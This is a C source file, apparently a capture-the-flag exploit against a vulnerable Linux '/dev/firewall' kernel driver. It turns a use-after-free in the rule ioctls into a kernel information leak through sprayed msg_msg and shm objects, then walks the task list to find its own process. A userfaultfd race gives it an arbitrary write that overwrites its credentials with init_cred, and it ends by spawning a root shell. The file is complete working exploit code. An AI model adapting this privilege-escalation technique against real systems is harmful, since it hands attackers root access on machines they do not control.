#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <poll.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define DEVICE_PATH "/dev/firewall"
#define PAGE_FAULT_ADDR 0xdead000

#define DEVICE_NAME "firewall"
#define CLASS_NAME  "firewall"

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define ERROR -1
#define SUCCESS 0
#define MAX_RULES 0x80

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

#define DESC_MAX 0x800

typedef struct 
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

typedef struct
{
    char iface[16];
    char name[16];
    uint32_t ip;
    uint32_t netmask;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    uint8_t is_duplicated;
    char desc[DESC_MAX];
} rule_t;

typedef struct
{
    long mtype;
    char mtext[0x1];
} msg_buf;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security; // available in selinux
} msg_header;

ulong kernel_base, kernel_heap;
ulong user_cs, user_sp, user_ss, user_rflags;
ulong init_ipc_namespace, init_task, init_cred;
pthread_t tid;
int firewall_fd;
ulong *leaks;
ulong ufd_page;
uint64_t target_addr;
uint32_t target_idx, target_size;
const uint32_t read_idx = 0, write_idx = 1;

void save_state(void);
int add_rule(int, uint8_t, char*, uint8_t);
int del_rule(int, uint8_t, uint8_t);
int edit_rule(int, uint8_t, char*, uint8_t, bool);
int dup_rule(int, uint8_t, uint8_t);
int userfaultfd(int);
void *page_fault_handler(void *);
int initialize_ufd(void);
void get_msg(int, void*, size_t, long, int);
void send_msg(int, void*, size_t, int);

int main()
{
    firewall_fd = open_dev(DEVICE_PATH);
    printf("size rule_t: %d\n", sizeof(rule_t));
    printf("size user_rule_t: %d\n", sizeof(user_rule_t));
    puts("[*] filewall_rule_in: 0xffffffffc00024c8");
    puts("[*] filewall_rule_out: 0xffffffffc00024c0");
    char payload[0x2000];
    memset(payload, 0, sizeof(payload));

    // smooth the exploit???
    // for (int i = 0x50; i < 0x54; i++) {
    //     add_rule(firewall_fd, i, payload, INBOUND);
    // }
    // prepare msg_queue
    int qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT), size;

    // prepare uaf

    add_rule(firewall_fd, read_idx, payload, INBOUND);
    dup_rule(firewall_fd, read_idx, INBOUND);
    del_rule(firewall_fd, read_idx, INBOUND);

    // allocate old chunk with msg_msg struct
    // if msg size is + msg_msg struct size > 0x1000 => kernel will split the msg into segments
    // the msg_msgseg struct contains a pointer to the next msg_msgseg struct and the rest is msg
    // it allocated by kmalloc(size of segment + msg_msgseg struct size) => it will stored in any slab at any size
    // out target is shm struct => we need segment stored in kmalloc-32 => msg size == 0x1010 is enough
    size = 0x1010;  
    msg_buf *message = (msg_buf *) payload;
    message->mtype = 1;
    memset(message->mtext, 0x41, size);
    send_msg(qid, message, size - 0x30, 0);

    // spray shmem struct
    int shmid;
    char *shmaddr;
    for (int i=0;i<0x50;i++) {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
            panic("[!] Shmget error!");
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == -1) {
            panic("[!] Shmat error!");
        }
    }

    msg_header msgheader;
    size = 0x1400;
    memset(&msgheader, 0, sizeof(msg_header));
    msgheader.ll_next = (void *) 0x4141414141414141;
    msgheader.ll_prev = (void *) 0x4242424242424242;
    msgheader.m_type = 1;
    msgheader.m_ts = size;
    memset(payload, 0, sizeof(payload));
    memcpy(payload, (void *)&msgheader, 0x20);
    edit_rule(firewall_fd, read_idx, payload, OUTBOUND, 0);

    // leak 
    char output[0x2000];
    get_msg(qid, output, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    //dump_output(output, 0x2000);

    for (int i = 0; i < size / 8; i++) {
        if ((*(uint64_t *)(output + i * 8) & 0xfff) == 0x7a0)
        {
            init_ipc_namespace = *(uint64_t *)(output + i * 8);
            break;
        }
    }

    kernel_base = init_ipc_namespace - (0xffffffff81c3d7a0 - 0xffffffff81000000);
    init_task = kernel_base + (0xffffffff81c124c0 - 0xffffffff81000000);
    init_cred = kernel_base + (0xffffffff81c33060 - 0xffffffff81000000);
    printf("[+] init_ipc_namespace: 0x%llx\n", init_ipc_namespace);
    printf("[+] kernel_base: 0x%llx\n", kernel_base);
    printf("[+] init_task: 0x%llx\n", init_task);
    printf("[+] init_cred: 0x%llx\n", init_cred);

    // find current task_struct
    // pid at offset 0x398
    memset((void *)&msgheader, 0, sizeof(msg_header));
    memset(output, 0, sizeof(output));
    memset(payload, 0, sizeof(payload));
    msgheader.m_type = 1;
    msgheader.m_ts = size;
    msgheader.next = (void *)init_task + 0x298
                            - 0x8; // one null qword beforehand to avoid crash
    memcpy(payload, (void *)&msgheader, sizeof(msg_header));
    edit_rule(firewall_fd, 0, payload, OUTBOUND, 1);

    // debug();
    get_msg(qid, output, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

    int32_t pid;
    uint64_t prev, curr;
    memcpy((void*)&prev, (void *)(output + 0xfe0), 8);
    memcpy((void*)&pid, (void *)(output + 0x10d8), 4);
    printf("%d %d\n", pid, getpid());

    while (pid != getpid())
    {
        curr = prev - 0x298;
        msgheader.next = (void *)prev - 0x8;
        memcpy(payload, (void *)&msgheader, sizeof(msg_header));
        edit_rule(firewall_fd, read_idx, payload, OUTBOUND, 1);
        get_msg(qid, output, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        memcpy((void*)&prev, (void *)(output + 0xfe0), 8);
        memcpy((void*)&pid, (void *)(output + 0x10d8), 4);
        printf("%d %d\n", pid, getpid());
    }
    printf("[+] found current task struct: 0x%llx\n", curr);

    // prepare uaf to arb write
    add_rule(firewall_fd, write_idx, payload, INBOUND);
    dup_rule(firewall_fd, write_idx, INBOUND);
    del_rule(firewall_fd, write_idx, INBOUND);

    //prepare payload to overwrite cred
    int ufd = initialize_ufd();
    printf("[+] Userfault fd: %d\n", ufd);

    memset(payload, 0, sizeof(payload));
    void *evil_page = mmap((void*) PAGE_FAULT_ADDR - 0x1000, 0x1000,  PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    msg_buf *root = (msg_buf*) (ufd_page-0x8);
    root->mtype = 1;
    size = 0x1010;
    target_idx = 1;
    target_addr = curr + 0x538 - 0x8;
    // race with userfaultfd to get arb_write

    pthread_create(&tid, NULL, page_fault_handler, &ufd);
    
    // trigger here
    send_msg(qid, root, size-0x30, 0);

    pthread_join(tid, NULL);
    system("/bin/sh");
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

int initialize_ufd()
{
    int fd;

    ufd_page = mmap((void *) PAGE_FAULT_ADDR, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    if ((fd = userfaultfd(O_CLOEXEC|O_NONBLOCK)) == -1) 
    {
        panic("[!] Error: Userfaultfd failed!");
    }

    struct uffdio_api api = {
        .api = UFFD_API,
        .features = 0
    };

    if (ioctl(fd, UFFDIO_API, &api))
    {
        panic("[!] Error: ioctl - UFFDIO_API failed!");
    }

    if (api.api != UFFD_API) 
    {
        panic("[!] Error: Unexpected UFFD api version!");
    }

    struct uffdio_register req = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = (long) (ufd_page),
            .len = PAGE_SIZE,
        } 
    };

    if (ioctl(fd, UFFDIO_REGISTER, &req))
    {
        panic("[!] Error: ioctl - UFFDIO_REGISTER failed!");
    }

    return fd;
}

void *page_fault_handler(void *_ufd)
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;

    int ufd = *((int *) _ufd);

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0)
    {
        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            panic("[!] Error: Polling failed!");
        }

        if (read(ufd ,&fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) 
        {
            panic("[!] Error: Read fault_msg failed!");
        }

        char *page_fault_location = (char *) fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != ufd_page))
        {
            panic("[!] Error: Unexpected pagefault!");
        }

        if (page_fault_location == (void *) 0xdead000)
        {
            puts("Alright, we triggered our pagefault");
            printf("[*] Page fault at address %p!\n", page_fault_location);
                
            // change to init_cred
            char ufd_payload[0x1000];
            memset(ufd_payload, 0x43, sizeof(ufd_payload));
            memcpy((void *)(ufd_payload + 0x1000-0x30), (void *)&init_cred, 8);
            memcpy((void *)(ufd_payload + 0x1000-0x30 + 8), (void *)&init_cred, 8);

            struct uffdio_copy ufd_copy;
            ufd_copy.src = (unsigned long)ufd_payload;
            ufd_copy.dst = ufd_page;
            ufd_copy.len = 0x1000;
            ufd_copy.mode = 0;
            ufd_copy.copy = 0;
            
            char buffer[0x2000];
            memset(buffer, 0, sizeof(buffer));

            msg_header evil;
            memset((void *)&evil, 0, sizeof(evil));
            evil.ll_next = (void *)0x1337babe;
            evil.ll_prev = (void *)0xbaadf00d;
            evil.m_type = 1;
            evil.m_ts = 0x1008 - 0x30;
            evil.next = (void *)target_addr;
            memcpy(buffer, (void *)&evil, sizeof(msg_header));
            edit_rule(firewall_fd, write_idx, buffer, OUTBOUND, 1);
            //debug();
            if (ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
            {
                perror("ioctl(UFFDIO_COPY)");
                exit(-1);
            }
            // dump_output(ufd_page, 0x1000);
        }

        // unblock userfaultfd
        struct uffdio_register uffdio_register;
        uffdio_register.range.start = fault_msg.arg.pagefault.address;
        uffdio_register.range.len = PAGE_SIZE;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

        ioctl(ufd, UFFDIO_UNREGISTER, &uffdio_register.range);
        return;
    }
}

int add_rule(int fd, uint8_t idx, char *payload, uint8_t type)
{
    user_rule_t user_rule;
    memset((void *) &user_rule, 0, sizeof(user_rule_t));
    user_rule.idx = idx;
    user_rule.type = type;
    
    // parse payload
    char tmp[0x10];
    memset(tmp, 0, sizeof(tmp));
    uint32_t ip = *(uint32_t*)&payload[0x20];
    sprintf(tmp, "%d.%d.%d.%d", 
                ip & 0x000000ff, 
                (ip & 0x0000ff00) >> 8, 
                (ip & 0x00ff0000) >> 16, 
                (ip & 0xff000000) >> 24);
    memcpy((void *)user_rule.ip, tmp, 0x10);
    
    memset(tmp, 0, sizeof(tmp));
    uint32_t netmask = *(uint32_t*)&payload[0x24];
    sprintf(tmp, "%d.%d.%d.%d", 
                netmask & 0x000000ff, 
                (netmask & 0x0000ff00) >> 8, 
                (netmask & 0x00ff0000) >> 16, 
                (netmask & 0xff000000) >> 24);

    memcpy(&user_rule.netmask, tmp, 0x10);

    memcpy(&user_rule.iface, payload, 0x10);
    memcpy(&user_rule.name, &payload[0x10], 0x10);
    memcpy(&user_rule.proto, &payload[0x28], 2);
    memcpy(&user_rule.port, &payload[0x2a], 2);
    memcpy(&user_rule.action, &payload[0x2c], 2);

    int ret = ioctl(firewall_fd, ADD_RULE, &user_rule);
    assert(ret != ERROR);
}

int del_rule(int fd, uint8_t idx, uint8_t type)
{
    user_rule_t user_rule;
    user_rule.idx = idx;
    user_rule.type = type;
    int ret = ioctl(firewall_fd, DELETE_RULE, &user_rule);
    assert(ret != ERROR);
}

int edit_rule(int fd, uint8_t idx, char *payload, uint8_t type, bool valid)
{
    user_rule_t user_rule;
    memset((void *) &user_rule, 0, sizeof(user_rule_t));
    user_rule.idx = idx;
    user_rule.type = type;

    // parse payload
    char tmp[0x10];
    memset(tmp, 0, sizeof(tmp));
    uint32_t ip = *(uint32_t*)&payload[0x20];
    sprintf(tmp, "%d.%d.%d.%d", 
                ip & 0x000000ff, 
                (ip & 0x0000ff00) >> 8, 
                (ip & 0x00ff0000) >> 16, 
                (ip & 0xff000000) >> 24);
    memcpy((void *)&user_rule.ip, tmp, 0x10);
    
    memset(tmp, 0, sizeof(tmp));
    uint32_t netmask = *(uint32_t*)&payload[0x24];
    sprintf(tmp, "%d.%d.%d.%d", 
                netmask & 0x000000ff, 
                (netmask & 0x0000ff00) >> 8, 
                (netmask & 0x00ff0000) >> 16, 
                (netmask & 0xff000000) >> 24);
    memcpy(&user_rule.netmask, tmp, 0x10);

    memcpy(&user_rule.iface, payload, 0x10);
    memcpy(&user_rule.name, &payload[0x10], 0x10);
    memcpy(&user_rule.proto, &payload[0x28], 2);
    memcpy(&user_rule.port, &payload[0x2a], 2);
    memcpy(&user_rule.action, &payload[0x2c], 2);

    if (!valid) {
        strcpy(&user_rule.ip, "nope");
        strcpy(&user_rule.netmask, "nope");
    }
    int ret = ioctl(firewall_fd, EDIT_RULE, &user_rule);
}

int dup_rule(int fd, uint8_t idx, uint8_t type)
{
    user_rule_t user_rule;
    user_rule.idx = idx;
    user_rule.type = type;

    int ret = ioctl(firewall_fd, DUP_RULE, &user_rule);
    assert(ret != ERROR);
}

